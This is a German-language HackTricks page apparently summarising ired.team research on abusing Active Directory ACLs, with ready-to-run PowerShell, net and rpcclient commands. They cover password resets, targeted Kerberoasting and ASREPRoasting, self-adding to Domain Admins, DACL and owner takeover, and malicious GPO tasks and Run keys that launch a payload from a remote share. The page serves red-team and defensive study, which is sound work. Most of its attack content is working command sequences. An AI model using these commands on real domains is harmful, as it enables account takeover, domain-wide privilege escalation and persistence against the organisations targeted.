# Missbrauch von Active Directory ACLs/ACEs

{% hint style="success" %}
Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstütze HackTricks</summary>

* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

**Diese Seite ist hauptsächlich eine Zusammenfassung der Techniken von** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **und** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Für weitere Details, siehe die Originalartikel.**

## **GenericAll-Rechte auf Benutzer**

Dieses Privileg gewährt einem Angreifer die volle Kontrolle über ein Zielbenutzerkonto. Sobald die `GenericAll`-Rechte mit dem Befehl `Get-ObjectAcl` bestätigt sind, kann ein Angreifer:

* **Das Passwort des Ziels ändern**: Mit `net user <username> <password> /domain` kann der Angreifer das Passwort des Benutzers zurücksetzen.
* **Gezieltes Kerberoasting**: Weisen Sie dem Benutzerkonto ein SPN zu, um es kerberoastable zu machen, und verwenden Sie dann Rubeus und targetedKerberoast.py, um die Ticket-Granting-Ticket (TGT)-Hashes zu extrahieren und zu versuchen, sie zu knacken.
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
* **Targeted ASREPRoasting**: Deaktivieren Sie die Vor-Authentifizierung für den Benutzer, wodurch sein Konto anfällig für ASREPRoasting wird.
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll-Rechte auf Gruppe**

Dieses Privileg ermöglicht es einem Angreifer, Gruppenmitgliedschaften zu manipulieren, wenn er `GenericAll`-Rechte auf einer Gruppe wie `Domain Admins` hat. Nachdem der Angreifer den distinguished name der Gruppe mit `Get-NetGroup` identifiziert hat, kann er:

* **Sich Selbst zur Domain Admins Gruppe Hinzufügen**: Dies kann über direkte Befehle oder mithilfe von Modulen wie Active Directory oder PowerSploit erfolgen.
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write on Computer/User**

Das Halten dieser Berechtigungen auf einem Computerobjekt oder einem Benutzerkonto ermöglicht:

* **Kerberos Resource-based Constrained Delegation**: Ermöglicht die Übernahme eines Computerobjekts.
* **Shadow Credentials**: Verwenden Sie diese Technik, um ein Computer- oder Benutzerkonto zu impersonieren, indem Sie die Berechtigungen zum Erstellen von Shadow Credentials ausnutzen.

## **WriteProperty on Group**

Wenn ein Benutzer `WriteProperty`-Rechte auf allen Objekten für eine bestimmte Gruppe (z. B. `Domain Admins`) hat, kann er:

* **Sich Selbst zur Domain Admins Gruppe Hinzufügen**: Erreichbar durch die Kombination der Befehle `net user` und `Add-NetGroupUser`, ermöglicht diese Methode die Eskalation von Berechtigungen innerhalb der Domäne.
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Selbst (Selbstmitgliedschaft) in Gruppe**

Dieses Privileg ermöglicht Angreifern, sich selbst zu bestimmten Gruppen hinzuzufügen, wie z.B. `Domain Admins`, durch Befehle, die die Gruppenmitgliedschaft direkt manipulieren. Die Verwendung der folgenden Befehlssequenz ermöglicht die Selbsthinzufügung:
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Selbstmitgliedschaft)**

Ein ähnliches Privileg, das Angreifern erlaubt, sich direkt zu Gruppen hinzuzufügen, indem sie die Gruppenattribute ändern, wenn sie das Recht `WriteProperty` für diese Gruppen haben. Die Bestätigung und Ausführung dieses Privilegs erfolgt mit:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Das Halten des `ExtendedRight` für einen Benutzer für `User-Force-Change-Password` ermöglicht Passwortzurücksetzungen, ohne das aktuelle Passwort zu kennen. Die Überprüfung dieses Rechts und dessen Ausnutzung kann über PowerShell oder alternative Befehlszeilentools erfolgen, die mehrere Methoden zum Zurücksetzen des Passworts eines Benutzers anbieten, einschließlich interaktiver Sitzungen und Einzeiler für nicht-interaktive Umgebungen. Die Befehle reichen von einfachen PowerShell-Aufrufen bis hin zur Verwendung von `rpcclient` auf Linux, was die Vielseitigkeit der Angriffsvektoren demonstriert.
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner auf Gruppe**

Wenn ein Angreifer feststellt, dass er `WriteOwner`-Rechte über eine Gruppe hat, kann er die Eigentümerschaft der Gruppe auf sich selbst ändern. Dies ist besonders wirkungsvoll, wenn es sich bei der betreffenden Gruppe um `Domain Admins` handelt, da die Änderung der Eigentümerschaft eine umfassendere Kontrolle über die Gruppenattribute und die Mitgliedschaft ermöglicht. Der Prozess umfasst die Identifizierung des richtigen Objekts über `Get-ObjectAcl` und dann die Verwendung von `Set-DomainObjectOwner`, um den Eigentümer entweder durch SID oder Namen zu ändern.
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite auf Benutzer**

Diese Berechtigung ermöglicht es einem Angreifer, Benutzerattribute zu ändern. Insbesondere kann der Angreifer mit `GenericWrite`-Zugriff den Anmeldeskriptpfad eines Benutzers ändern, um ein bösartiges Skript bei der Benutzeranmeldung auszuführen. Dies wird erreicht, indem der Befehl `Set-ADObject` verwendet wird, um die `scriptpath`-Eigenschaft des Zielbenutzers auf das Skript des Angreifers zu aktualisieren.
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Mit diesem Privileg können Angreifer die Gruppenmitgliedschaft manipulieren, indem sie sich selbst oder andere Benutzer zu bestimmten Gruppen hinzufügen. Dieser Prozess umfasst das Erstellen eines Anmeldeobjekts, die Verwendung dieses Objekts zum Hinzufügen oder Entfernen von Benutzern aus einer Gruppe und die Überprüfung der Mitgliedschaftsänderungen mit PowerShell-Befehlen.
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Das Besitzen eines AD-Objekts und das Vorhandensein von `WriteDACL`-Befugnissen darauf ermöglicht es einem Angreifer, sich selbst `GenericAll`-Befugnisse über das Objekt zu gewähren. Dies wird durch ADSI-Manipulation erreicht, die vollständige Kontrolle über das Objekt und die Möglichkeit zur Änderung seiner Gruppenmitgliedschaften ermöglicht. Trotz dessen gibt es Einschränkungen, wenn versucht wird, diese Berechtigungen mit den `Set-Acl` / `Get-Acl` Cmdlets des Active Directory-Moduls auszunutzen.
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replikation im Domänenbereich (DCSync)**

Der DCSync-Angriff nutzt spezifische Replikationsberechtigungen in der Domäne, um einen Domänencontroller zu imitieren und Daten, einschließlich Benutzeranmeldeinformationen, zu synchronisieren. Diese leistungsstarke Technik erfordert Berechtigungen wie `DS-Replication-Get-Changes`, die es Angreifern ermöglichen, sensible Informationen aus der AD-Umgebung zu extrahieren, ohne direkten Zugriff auf einen Domänencontroller zu haben. [**Erfahren Sie hier mehr über den DCSync-Angriff.**](../dcsync.md)

## GPO-Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO-Delegation

Delegierter Zugriff zur Verwaltung von Gruppenrichtlinienobjekten (GPOs) kann erhebliche Sicherheitsrisiken darstellen. Wenn beispielsweise ein Benutzer wie `offense\spotless` die Rechte zur Verwaltung von GPOs delegiert bekommt, kann er über Berechtigungen wie **WriteProperty**, **WriteDacl** und **WriteOwner** verfügen. Diese Berechtigungen können für böswillige Zwecke missbraucht werden, wie mit PowerView identifiziert: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### GPO-Berechtigungen auflisten

Um falsch konfigurierte GPOs zu identifizieren, können die Cmdlets von PowerSploit miteinander verknüpft werden. Dies ermöglicht die Entdeckung von GPOs, für die ein bestimmter Benutzer Berechtigungen zur Verwaltung hat: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computer mit einer bestimmten Richtlinie angewendet**: Es ist möglich zu ermitteln, auf welche Computer eine bestimmte GPO angewendet wird, was hilft, den Umfang der potenziellen Auswirkungen zu verstehen. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Richtlinien, die auf einen bestimmten Computer angewendet werden**: Um zu sehen, welche Richtlinien auf einen bestimmten Computer angewendet werden, können Befehle wie `Get-DomainGPO` verwendet werden.

**OUs mit einer bestimmten Richtlinie angewendet**: Die Identifizierung von organisatorischen Einheiten (OUs), die von einer bestimmten Richtlinie betroffen sind, kann mit `Get-DomainOU` erfolgen.

### Missbrauch von GPO - New-GPOImmediateTask

Falsch konfigurierte GPOs können ausgenutzt werden, um Code auszuführen, beispielsweise durch das Erstellen einer sofortigen geplanten Aufgabe. Dies kann durchgeführt werden, um einen Benutzer zur lokalen Administratorgruppe auf betroffenen Maschinen hinzuzufügen, was die Berechtigungen erheblich erhöht:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy-Modul - Missbrauch von GPO

Das GroupPolicy-Modul, falls installiert, ermöglicht die Erstellung und Verknüpfung neuer GPOs sowie das Setzen von Präferenzen wie Registrierungswerten, um Backdoors auf betroffenen Computern auszuführen. Diese Methode erfordert, dass die GPO aktualisiert wird und ein Benutzer sich am Computer anmeldet, um die Ausführung zu ermöglichen:
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Missbrauch von GPO

SharpGPOAbuse bietet eine Methode, um bestehende GPOs zu missbrauchen, indem Aufgaben hinzugefügt oder Einstellungen geändert werden, ohne neue GPOs erstellen zu müssen. Dieses Tool erfordert die Modifikation bestehender GPOs oder die Verwendung von RSAT-Tools, um neue zu erstellen, bevor Änderungen angewendet werden:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Zwangsweise Richtlinienaktualisierung

GPO-Updates erfolgen typischerweise alle 90 Minuten. Um diesen Prozess zu beschleunigen, insbesondere nach der Implementierung einer Änderung, kann der Befehl `gpupdate /force` auf dem Zielcomputer verwendet werden, um eine sofortige Richtlinienaktualisierung zu erzwingen. Dieser Befehl stellt sicher, dass alle Änderungen an GPOs angewendet werden, ohne auf den nächsten automatischen Aktualisierungszyklus zu warten.

### Unter der Haube

Bei der Überprüfung der geplanten Aufgaben für ein bestimmtes GPO, wie die `Misconfigured Policy`, kann die Hinzufügung von Aufgaben wie `evilTask` bestätigt werden. Diese Aufgaben werden durch Skripte oder Befehlszeilentools erstellt, die darauf abzielen, das Systemverhalten zu ändern oder Berechtigungen zu eskalieren.

Die Struktur der Aufgabe, wie sie in der von `New-GPOImmediateTask` generierten XML-Konfigurationsdatei dargestellt ist, beschreibt die Einzelheiten der geplanten Aufgabe - einschließlich des auszuführenden Befehls und seiner Auslöser. Diese Datei zeigt, wie geplante Aufgaben innerhalb von GPOs definiert und verwaltet werden, und bietet eine Methode zur Ausführung beliebiger Befehle oder Skripte im Rahmen der Durchsetzung von Richtlinien.

### Benutzer und Gruppen

GPOs ermöglichen auch die Manipulation von Benutzer- und Gruppenmitgliedschaften auf Zielsystemen. Durch das direkte Bearbeiten der Benutzer- und Gruppenrichtliniendateien können Angreifer Benutzer zu privilegierten Gruppen, wie der lokalen `administrators`-Gruppe, hinzufügen. Dies ist durch die Delegation von GPO-Verwaltungsberechtigungen möglich, die die Modifikation von Richtliniendateien erlaubt, um neue Benutzer hinzuzufügen oder Gruppenmitgliedschaften zu ändern.

Die XML-Konfigurationsdatei für Benutzer und Gruppen beschreibt, wie diese Änderungen implementiert werden. Durch das Hinzufügen von Einträgen zu dieser Datei können bestimmten Benutzern erhöhte Berechtigungen auf betroffenen Systemen gewährt werden. Diese Methode bietet einen direkten Ansatz zur Eskalation von Berechtigungen durch GPO-Manipulation.

Darüber hinaus können auch zusätzliche Methoden zur Ausführung von Code oder zur Aufrechterhaltung der Persistenz in Betracht gezogen werden, wie z.B. die Nutzung von Anmelde-/Abmeldeskripten, das Ändern von Registrierungsschlüsseln für Autoruns, das Installieren von Software über .msi-Dateien oder das Bearbeiten von Dienstkonfigurationen. Diese Techniken bieten verschiedene Möglichkeiten, um den Zugriff aufrechtzuerhalten und Zielsysteme durch den Missbrauch von GPOs zu kontrollieren.

## Referenzen

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
